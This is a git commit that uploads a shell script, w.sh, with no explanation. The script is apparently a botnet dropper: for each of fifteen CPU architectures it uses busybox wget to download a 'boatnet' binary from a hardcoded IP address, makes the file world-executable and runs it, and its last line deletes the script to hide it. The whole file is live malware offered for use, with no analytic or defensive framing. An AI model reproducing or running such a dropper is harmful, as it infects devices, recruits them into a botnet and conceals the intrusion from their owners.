6c5c9e80256d64bba28a575df772ec91f46eacbc
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-11-16 07:00:27 +0500

    Add files via upload

---
+++ w.sh
@@ -0,0 +1,17 @@
+busybox wget http://85.192.37.173/hiddenbin/boatnet.x86; chmod 777 boatnet.x86; ./boatnet.x86 android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.mips; chmod 777 boatnet.mips; ./boatnet.mips android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.arc; chmod 777 boatnet.arc; ./boatnet.arc android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.i468; chmod 777 boatnet.i468; ./boatnet.i468 android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.i686; chmod 777 boatnet.i686; ./boatnet.i686 android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.x86_64; chmod 777 boatnet.x86_64; ./boatnet.x86_64 android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.mpsl; chmod 777 boatnet.mpsl; ./boatnet.mpsl android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.arm; chmod 777 boatnet.arm; ./boatnet.arm android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.arm5; chmod 777 boatnet.arm5; ./boatnet.arm5 android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.arm6; chmod 777 boatnet.arm6; ./boatnet.arm6 android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.arm7; chmod 777 boatnet.arm7; ./boatnet.arm7 android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.ppc; chmod 777 boatnet.ppc; ./boatnet.ppc android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.spc; chmod 777 boatnet.spc; ./boatnet.spc android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.m68k; chmod 777 boatnet.m68k; ./boatnet.m68k android
+busybox wget http://85.192.37.173/hiddenbin/boatnet.sh4; chmod 777 boatnet.sh4; ./boatnet.sh4 android
+
+rm $0
